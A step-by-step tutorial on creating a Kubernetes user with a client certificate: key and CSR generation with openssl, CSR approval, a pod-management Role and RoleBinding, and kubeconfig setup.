First, this user must have a certificate issued by the Kubernetes cluster, and then present that certificate to the Kubernetes API. 1. Create a Private Key​ The following commands generate a PKI private key and a Certificate Signing Request (CSR). It is important to set the CN (Common Name) and O (Organization) attributes of the CSR. CN is the name of the user, and O is the group that this user will belong to. openssl genrsa -out myuser.key 2048 openssl req -new -key myuser.key -out myuser.csr -subj \"/CN=myuser\" 2. Create a CertificateSigningRequest (CSR)​ Create a CertificateSigningRequest resource in Kubernetes and submit it using kubectl. cat <<EOF | kubectl apply -f - apiVersion: certificates.k8s.io/v1 kind: CertificateSigningRequest metadata: name: myuser spec: request: $(cat myuser.csr | base64 | tr -d \"\\n\") signerName: kubernetes.io/kube-apiserver-client expirationSeconds: 86400 # one day usages: - client auth EOF Important Points​ usages must be set to client auth. expirationSeconds can be set to 3600 (1 hour) or 864000 (10 days). The request field is the base64-encoded value of the CSR file content. 3. Approve the CertificateSigningRequest​ # List all CSRs kubectl get csr # Approve the CSR kubectl certificate approve myuser 4. Retrieve and Export the Certificate​ # Get the certificate in YAML format kubectl get csr/myuser -o yaml # Export the issued certificate to a file kubectl get csr myuser -o jsonpath='{.status.certificate}' | base64 -d > myuser.crt 5. Create Role and RoleBinding​ With the certificate created, define the Role and RoleBinding to allow the user access to Kubernetes cluster resources. # Create a Role with permissions to manage Pods kubectl create role developer --verb=create --verb=get --verb=list --verb=update --verb=delete --resource=pods # Create a RoleBinding to bind the role to the user kubectl create rolebinding developer-binding-myuser --role=developer --user=myuser 6. Add User to Kubeconfig​ # Add new credentials to kubeconfig kubectl config set-credentials myuser --client-key=myuser.key --client-certificate=myuser.crt --embed-certs=true # Create a new context for the user kubectl config set-context myuser --cluster=kubernetes --user=myuser # Switch to the new context kubectl config use-context myuser Key Takeaway​ By following these steps, you can securely create a certificate for a Kubernetes user, assign appropriate roles, and configure kubeconfig to authenticate the user with the Kubernetes API server.
